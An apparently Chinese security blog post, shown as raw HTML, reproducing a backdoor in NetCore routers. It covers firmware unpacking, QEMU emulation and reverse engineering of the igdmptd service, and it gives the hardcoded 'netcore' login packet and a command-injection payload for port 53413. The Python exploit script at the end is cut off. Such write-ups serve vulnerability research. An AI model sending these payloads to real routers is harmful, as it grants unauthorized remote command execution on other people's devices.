@@ -1,0 +1,775 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":100,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
+  
+  <title>
+    NetCore RCE漏洞 |
+    
+    Hexo
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="NetCore 后门RCE漏洞| 0 | 前言在netcore路由器设备中存在硬编码的登录密码,可以通过登录+命令注入实现执行任意系统命令、上传&#x2F;下载文件、控制路由器任意命令执行 | 1 | 固件下载&amp;解包&amp;qemu配置固件下载下载地址 固件解包1binwalk -e --preserve-symlinks T1.bin  qemu配置本固件是socket服务,我习惯使用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NetCore RCE漏洞">
+<meta property="og:url" content="https://khighl.github.io.git/2025/07/10/NetCore%20RCE%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="NetCore 后门RCE漏洞| 0 | 前言在netcore路由器设备中存在硬编码的登录密码,可以通过登录+命令注入实现执行任意系统命令、上传&#x2F;下载文件、控制路由器任意命令执行 | 1 | 固件下载&amp;解包&amp;qemu配置固件下载下载地址 固件解包1binwalk -e --preserve-symlinks T1.bin  qemu配置本固件是socket服务,我习惯使用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://khighl.github.io.git/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752153503516.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752153753391.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752153932494.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752154024874.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752154075672.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752154105836.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752154175527.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752154189485.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752154273496.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752154351239.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752154619828.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752154822820.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752155136236.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752155311034.png">
+<meta property="article:published_time" content="2025-07-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-07-10T13:49:36.407Z">
+<meta property="article:author" content="zer00ne">
+<meta property="article:tag" content="iot漏洞复现">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://khighl.github.io.git/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752153503516.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="NetCore RCE漏洞">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">NetCore RCE漏洞</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NetCore-%E5%90%8E%E9%97%A8RCE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">NetCore 后门RCE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">| 0 | 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%9B%BA%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E8%A7%A3%E5%8C%85-qemu%E9%85%8D%E7%BD%AE"><span class="toc-number">1.2.</span> <span class="toc-text">| 1 | 固件下载&amp;解包&amp;qemu配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.2.1.</span> <span class="toc-text">固件下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8C%85"><span class="toc-number">1.2.2.</span> <span class="toc-text">固件解包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu%E9%85%8D%E7%BD%AE"><span class="toc-number">1.2.3.</span> <span class="toc-text">qemu配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">| 2 | 逆向分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-EXP"><span class="toc-number">1.5.</span> <span class="toc-text">| 3 | EXP</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">16</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-NetCore RCE漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-07-09T16:00:00.000Z" itemprop="datePublished">2025-07-10</time>
+    <time style="display: none;" id="post-update-time">2025-07-10</time>
+  </span>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="NetCore-后门RCE漏洞"><a href="#NetCore-后门RCE漏洞" class="headerlink" title="NetCore 后门RCE漏洞"></a>NetCore 后门RCE漏洞</h1><h2 id="0-前言"><a href="#0-前言" class="headerlink" title="| 0 | 前言"></a>| 0 | 前言</h2><p>在<code>netcore</code>路由器设备中存在硬编码的登录密码,可以通过<code>登录</code>+<code>命令注入</code>实现执行任意系统命令、上传&#x2F;下载文件、控制路由器任意命令执行</p>
+<h2 id="1-固件下载-解包-qemu配置"><a href="#1-固件下载-解包-qemu配置" class="headerlink" title="| 1 | 固件下载&amp;解包&amp;qemu配置"></a>| 1 | 固件下载&amp;解包&amp;qemu配置</h2><h3 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h3><p><a target="_blank" rel="noopener" href="http://www.uzzf.com/qudong/70779.html">下载地址</a></p>
+<h3 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e --preserve-symlinks T1.bin</span><br></pre></td></tr></table></figure>
+
+<h3 id="qemu配置"><a href="#qemu配置" class="headerlink" title="qemu配置"></a>qemu配置</h3><p>本固件是<code>socket</code>服务,我习惯使用<code>qemu</code>的<code>system</code>仿真</p>
+<p>下载所需的<code>qemu</code>,内核文件</p>
+<p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2">debian_wheezy_mipsel_standard.qcow2</a></p>
+<p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta">vmlinux-3.2.0-4-4kc-malta</a></p>
+<p>将文件复制到虚拟机中,在同一路径下创建<code>start.sh</code>,赋予可执行权限<code>+x</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">TAP接口配置</span></span><br><span class="line">TAP_IF=&quot;tap0&quot;</span><br><span class="line">BR_IF=&quot;br0&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确保 tap0 存在，并添加进 br0</span></span><br><span class="line">sudo ip tuntap add dev $TAP_IF mode tap</span><br><span class="line">sudo ip link set $TAP_IF up</span><br><span class="line">sudo brctl addif $BR_IF $TAP_IF</span><br><span class="line"></span><br><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_wheezy_mipsel_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -net nic,macaddr=00:16:3e:00:00:01 \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>
+
+<p>启动<code>qemu</code>后将固件的文件系统通过<code>scp</code>传入<code>qemu中</code></p>
+<h2 id="2-逆向分析"><a href="#2-逆向分析" class="headerlink" title="| 2 | 逆向分析"></a>| 2 | 逆向分析</h2><p>找到&#x2F;etc&#x2F;rcS,打开发现</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">DIRS=/var/tmp /var/run /var/ppp /var/udhcpc</span><br><span class="line"></span><br><span class="line">mount -t tmpfs -o size=16m tmpfs /var</span><br><span class="line">mount -t proc proc proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">mkdir /var/parame</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#mkdir /var/parame/brk</span></span></span><br><span class="line">mkdir /var/parame/parame</span><br><span class="line">/bin/param_load /var/parame/parame/param.tar.gzip</span><br><span class="line"></span><br><span class="line">cp -rf /cfg /var/</span><br><span class="line">rm -f /var/cfg/VERSION</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">cp</span> -f /web/lua/cfg/* /var/</span></span><br><span class="line">mkdir /var/tmp</span><br><span class="line">mkdir /var/tmp/bulletin/</span><br><span class="line">mkdir /var/tmp/param</span><br><span class="line">mkdir /var/run</span><br><span class="line">mkdir /var/run/lock</span><br><span class="line">mkdir /var/dnrd</span><br><span class="line">mkdir /var/ppp</span><br><span class="line">cp -f /sh/ppp/* /var/ppp</span><br><span class="line">cp /web/cgi-bin/cgitest.cgi /var/tmp/</span><br><span class="line">mkdir /var/udhcpc</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">/etc/resolv.conf</span></span><br><span class="line"></span><br><span class="line">cp -f /etc/VERSION /var/tmp/version_1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">insmod /lib/modules/ctf.ko</span></span><br><span class="line">insmod /lib/modules/emf.ko</span><br><span class="line">insmod /lib/modules/igs.ko</span><br><span class="line">insmod /lib/modules/et.ko</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">insmod /lib/modules/bcm57xx.ko</span></span><br><span class="line">insmod /lib/modules/wl.ko</span><br><span class="line">insmod /lib/modules/pptp.ko</span><br><span class="line">insmod /lib/modules/ipsec.ko</span><br><span class="line"></span><br><span class="line">vconfig set_name_type VLAN_PLUS_VID_NO_PAD</span><br><span class="line">ifconfig eth0 up</span><br><span class="line"></span><br><span class="line">vconfig add eth0 2</span><br><span class="line">vconfig add eth0 3</span><br><span class="line">vconfig add eth0 4</span><br><span class="line">vconfig add eth0 5</span><br><span class="line"></span><br><span class="line">vconfig add eth0 10</span><br><span class="line">vconfig add eth0 11</span><br><span class="line">vconfig add eth0 12</span><br><span class="line">vconfig add eth0 13</span><br><span class="line"></span><br><span class="line">brctl addbr br0</span><br><span class="line">brctl addif br0 eth1</span><br><span class="line"></span><br><span class="line">brctl addif br0 vlan10</span><br><span class="line">brctl addif br0 vlan11</span><br><span class="line">brctl addif br0 vlan12</span><br><span class="line">brctl addif br0 vlan13</span><br><span class="line"></span><br><span class="line">ifconfig eth1 up</span><br><span class="line">brctl setfd br0 0</span><br><span class="line">ifconfig br0 up</span><br><span class="line">brctl stp br0 off</span><br><span class="line"></span><br><span class="line">ifconfig vlan10 up</span><br><span class="line">ifconfig vlan11 up</span><br><span class="line">ifconfig vlan12 up</span><br><span class="line">ifconfig vlan13 up</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">insmod /lib/modules/main.ko</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">setvlan 31 0 0 0 0</span></span><br><span class="line">ifconfig pppoe up</span><br><span class="line">ifconfig vir1 hw ether 00:00:00:00:51:88</span><br><span class="line">ifconfig vir1 up</span><br><span class="line">ifconfig lo 127.0.0.1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">add by zhouqingwei</span></span><br><span class="line">checknvram</span><br><span class="line">cfe_update -d</span><br><span class="line">/bin/switch -d</span><br><span class="line">sleep 5</span><br><span class="line">mkdir /tmp/usb</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> fuck</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/bin/cmac -d</span></span><br><span class="line">/bin/igdmptd -d</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">echo</span> fuck1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到可执行文件的路径<code>/bin/igdmptd</code>,我们将其提取出来</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/zer00ne/Desktop/cve_review/stage1/netcore/_T1.bin.extracted/squashfs-root/igdmptd&#x27;</span><br><span class="line">    Arch:       mips-32-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX disabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    RWX:        Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>将其放入<code>IDA</code>中分析</p>
+<p><img src="/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752153503516.png" alt="1752153503516"></p>
+<p><code>main</code>函数先是<code>fork</code>子进程,再退出父进程.这会给我们的调试带来很大的麻烦,这里我直接把<code>call create_daemon</code>给<code>patch</code>成<code>nop</code>,不会影响程序逻辑.</p>
+<p><img src="/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752153753391.png" alt="1752153753391"></p>
+<p><code>create_server</code>函数创建了个套接字,然后<code>bind</code>到<code>0.0.0.0:53413</code>上</p>
+<p>这里本应该是大端序显示,但是不知道为什么不管是<code>checksec</code>还是<code>IDA</code>都给识别成小端序了(🤔🤔🤔)</p>
+<p>我们继续进入<code>operate_loop</code>中</p>
+<p><img src="/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752153932494.png" alt="1752153932494"></p>
+<p>首次接受数据后,因为<code>v2</code>是<code>0</code>,所以不会进入这个<code>if(v2)</code>中</p>
+<p>我们看到与这个<code>if</code>对应的<code>else</code>处</p>
+<p><img src="/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752154024874.png" alt="1752154024874"></p>
+<p>将接收到的数据复制一份,放在<code>v5</code>中,然后进入<code>do_mptlogin</code>中</p>
+<p><img src="/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752154075672.png" alt="1752154075672"></p>
+<p>这个<code>call_mpptlogin</code>函数与登录有关</p>
+<p><img src="/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752154105836.png" alt="1752154105836"></p>
+<p>逻辑简单到直接把输入数据的一部分与<code>netcore</code>对比,属于严重的硬编码密码</p>
+<p>如果密码正确,就会返回<code>0</code></p>
+<p><img src="/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752154175527.png" alt="1752154175527"></p>
+<p><img src="/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752154189485.png" alt="1752154189485"></p>
+<p>最终<code>do_mptlogin</code>也会返回<code>0</code>,<code>v2</code>会被赋值为<code>1</code>,代表已登录</p>
+<p>此时我们可以进入<code>if(v2)</code>中</p>
+<p><img src="/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752154273496.png" alt="1752154273496"></p>
+<p>根据输入数据的<code>2,4</code>字节的拼接出的<code>token</code>,选择进入不同的函数中处理</p>
+<p><img src="/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752154351239.png" alt="1752154351239"></p>
+<p>我们直接看到最后一个后门函数<code>do_syscmd</code>中,然后逆向分析<code>token</code>的条件</p>
+<p><code>buf[2]!= &#39;?&#39; &amp;&amp; &#39;$&#39;</code>,<code>token == 0</code>,<code>sizeof(payload) != 8</code>这三个条件才能使得进入<code>sys</code></p>
+<p><img src="/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752154619828.png" alt="1752154619828"></p>
+<p>把我们输入的数据接过复杂的拼接后直接传给<code>popen</code>,使得我们能够<code>RCE</code></p>
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>关于密码的输入,我选择第一次发送<code>b&quot;abcdefghijklmnopqrstuvwxyz&quot;</code>,然后查看那部分被用于和<code>netcore</code>进行<code>strcmp</code></p>
+<p><img src="/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752154822820.png" alt="1752154822820"></p>
+<p>所以我们这样写第一段<code>payload =b&#39;a&#39;*8+b&quot;netcore\x00&quot;</code></p>
+<p>然后我们逆向第二段的命令注入位置</p>
+<p>先构造第二段的<code>payload</code>为<code>payload=b&quot;\x00\x00\x00\x00&quot;+b&quot;abcdefghijklmnopqrstuvwxyz&quot;</code></p>
+<p><img src="/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752155136236.png" alt="1752155136236"></p>
+<p>所以第二段<code>payload</code>应该为<code>#payload=b&quot;\x00\x00\x00\x00&quot;+b&#39;b&#39;*4+f&quot;&#123;cmd&#125;&quot;.encode()</code></p>
+<p>我们试着输入<code>cmd=&quot;echo  I needed to control you &gt;&gt; /tmp/pwn.txt\x00&quot;</code></p>
+<p><img src="/images/NetCoreRCE%E6%BC%8F%E6%B4%9E/1752155311034.png" alt="1752155311034"></p>
+<p>可以看到我们执行了此命令</p>
+<h2 id="3-EXP"><a href="#3-EXP" class="headerlink" title="| 3 | EXP"></a>| 3 | EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">target_ip = <span class="string">&quot;192.168.52.134&quot;</span></span><br><span class="line">target_port = <span class="number">53413</span></span><br><span class="line"></span><br><span class="line">payload 